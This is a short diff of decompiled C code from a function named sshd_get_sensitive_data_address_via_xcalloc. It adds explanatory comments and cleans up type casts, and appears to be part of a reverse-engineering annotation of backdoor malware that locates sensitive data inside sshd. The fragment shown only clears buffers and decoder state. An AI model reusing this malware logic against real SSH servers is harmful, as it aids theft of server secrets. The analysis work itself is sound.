@@ -39,14 +39,16 @@ BOOL sshd_get_sensitive_data_address_via_xcalloc
   tracked_reg = 0xff;
   store_operand_ptr = (u8 *)0x0;
   hit_count = 0;
+  // AutoDoc: Zero the recorded store list before watching for `.bss` writes so only fresh candidates feed the ptr/ptr+8/ptr+0x10 heuristic.
   hit_cursor = store_hits;
   for (clear_idx = 0x20; clear_idx != 0; clear_idx = clear_idx + -1) {
-    *(undefined4 *)hit_cursor = 0;
+    *(u32 *)hit_cursor = 0;
     hit_cursor = (long *)((long)hit_cursor + 4);
   }
+  // AutoDoc: Wipe the MOV/LEA decoder context prior to every post-call scan so register tracking stays reliable.
   zero_ctx_cursor = &store_probe_ctx;
   for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
-    *(undefined4 *)&zero_ctx_cursor->instruction = 0;
+    *(u32 *)&zero_ctx_cursor->instruction = 0;
     zero_ctx_cursor = (dasm_ctx_t *)((long)&zero_ctx_cursor->instruction + 4);
   }
 LAB_001036eb:
